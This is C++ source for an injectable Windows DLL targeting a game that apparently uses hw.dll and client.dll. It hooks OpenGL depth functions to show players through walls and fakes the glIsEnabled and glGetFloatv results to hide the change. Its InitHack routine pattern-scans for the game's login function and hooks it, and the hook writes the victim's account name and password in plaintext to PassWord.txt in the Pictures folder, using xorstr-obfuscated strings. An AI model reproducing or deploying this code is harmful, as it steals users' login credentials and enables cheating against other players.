#include "MyHookAPi.hpp"
#include "StdioSdk.h"
#include <iostream>
#include <stdio.h>
#include <gl/GL.h>
#include <d3d11.h>
#include <tchar.h>
#include <ShlObj_core.h>
#include <thread>
#include <string>
#include  <vector>
#include <xorstr.hpp>
#pragma comment(lib,"opengl32.lib")
#pragma warning(disable : 4996)
r_studio_interface_t* g_pStudio;
ULONG32 *BlackCheck;
ULONG32 PassWorld = 0;
bool bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask){
	for (; *szMask; ++szMask, ++pData, ++bMask){
		if (*szMask == 'x' && *pData != *bMask){
			return false;
		}
	}
	return (*szMask) == NULL;
}
DWORD dwFindPattern(DWORD dwAddress, DWORD dwSize, BYTE* pbMask, char* szMask, int GetInx = 0){
	UCHAR Inx = 0;
	MEMORY_BASIC_INFORMATION Mem;
	try {
		for (DWORD i = NULL; i < dwSize; i++){
			if (bDataCompare((BYTE*)(dwAddress + i), pbMask, szMask)){
				if (!GetInx) {
					return (DWORD)(dwAddress + i);
				}
				else {
					if (Inx < GetInx) {
						Inx += 1;
					}
					else {
						return (DWORD)(dwAddress + i);
					}
				}
			}
		}
		return 0;
	}
	catch (...) {
		return 0;
	}
}
template<typename Fn>
Fn GetModule(const char * name) {
	HMODULE Module = NULL;
	while (!Module)
		Module = GetModuleHandleA(name);
	return reinterpret_cast<Fn>(Module);
}
struct  entity_state_s;
int StudioDrawPlayer(int flags, struct entity_state_s* pplayer) {
	GLclampd EspNer = 0, EspFar;
	EspFar = 0.5;
	glDepthRange(EspNer, EspFar);
	auto Ret = HookMessage::GetOring(StudioDrawPlayer)(flags, pplayer);
	EspFar = 1.f;
	glDepthRange(EspNer, EspFar);
	*BlackCheck = 0;
	return Ret;
}
GLboolean APIENTRY MyglIsEnabled(GLenum cap) {
	if (cap == GL_DEPTH_TEST) {
		return GL_FALSE;
	}
	return HookMessage::GetOring(MyglIsEnabled)(cap);
}
void APIENTRY MyglGetFloatv(GLenum cap, GLfloat* Parm) {
	if (cap == GL_DEPTH_RANGE) {
		Parm[0] = 0.f;
		Parm[1] = 1.f;
	}
	return HookMessage::GetOring(MyglGetFloatv)(cap, Parm);
}
DWORD __stdcall Login(const char* account, const char* passWorld, PVOID Unkonw, const char* Hash, bool False, char* UnkKonw2) {
	char pathTmp[MAX_PATH];
	std::string Path, PassWord;
	SHGetSpecialFolderPath(0, pathTmp, CSIDL_MYPICTURES, 0);
	Path = pathTmp;
	Path += xorstr_("\\PassWord.txt");
	PassWord = PassWord + xorstr_("’Àªß:") + account + "\n";
	PassWord = PassWord + xorstr_("√‹¬Î:") + passWorld;
	auto File = fopen(Path.c_str(), "w+");
	fwrite(PassWord.c_str(), PassWord.size(), 1, File);
	fclose(File);
	return HookMessage::GetOring(Login)(account, passWorld, Unkonw, Hash, False, UnkKonw2);
}

void InitHack() {
	using P_Funs = DWORD(__stdcall*)(const char* account, const char* passWorld, PVOID Unkonw, const char* Hash, bool False, char* UnkKonw2);
	ULONG hw = GetModule<ULONG>("hw.dll");
	ULONG Client = GetModule<ULONG>("client.dll");
	DWORD LoginFuns = dwFindPattern(hw, 0x0122A000, (PBYTE)xorstr_("\xE8\x00\x00\x00\x00\xFF\x75\xFC\x8B\xF0\x56\x68"), xorstr_("x????xxxxxxx"));
	LoginFuns = (*reinterpret_cast<PULONG32>(LoginFuns + 1)) + (LoginFuns + 5);
	HookMessage::Install(reinterpret_cast<P_Funs>(LoginFuns), Login);
}

bool DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {
	switch (fdwReason){
	case DLL_PROCESS_ATTACH:
		CloseHandle(CreateThread(nullptr, 0, reinterpret_cast<PTHREAD_START_ROUTINE>(InitHack), NULL, NULL, NULL));
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	default:
		break;
	}
	return true;
}